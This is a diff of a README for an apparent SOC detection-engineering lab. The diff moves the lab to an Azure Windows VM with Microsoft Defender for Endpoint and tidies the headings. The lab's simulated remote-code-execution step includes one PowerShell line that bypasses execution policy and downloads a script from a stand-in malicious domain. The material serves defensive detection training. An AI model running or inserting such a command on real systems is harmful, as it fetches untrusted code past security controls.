@@ -15,14 +15,17 @@ This lab mirrors real-world SOC detection engineering and incident response work
 ## 🖥️ Environment Configuration
 
 ### Infrastructure
-- AWS EC2 Windows Server Instance
+- Windows Virtual Machine (Microsoft Azure)
 - Public IP Address Assigned
 - Windows Firewall Disabled (for controlled simulation)
 - RDP Enabled
-- Microsoft Defender for Endpoint Onboarded
+- Microsoft Defender for Endpoint (MDE) Onboarded
+
+<img width="1438" height="868" alt="MDE-Onboard" src="https://github.com/user-attachments/assets/079f3c53-b164-4118-9b69-d853fe1e14d1" />
+
 
 ### Verification Steps
-- Confirm device visibility in Microsoft 365 Defender portal
+- Confirm device visibility in MDE portal
 - Validate telemetry ingestion
 - Confirm Advanced Hunting data availability
 
@@ -33,7 +36,7 @@ This lab mirrors real-world SOC detection engineering and incident response work
 ### Simulated Technique
 PowerShell-based command execution intended to mimic Remote Code Execution (RCE) behavior.
 
-Example command used for simulation:
+### Example command used for simulation:
 
 powershell
 powershell.exe -ExecutionPolicy Bypass -Command "Invoke-WebRequest http://malicious-domain/test.ps1 -OutFile test.ps1"
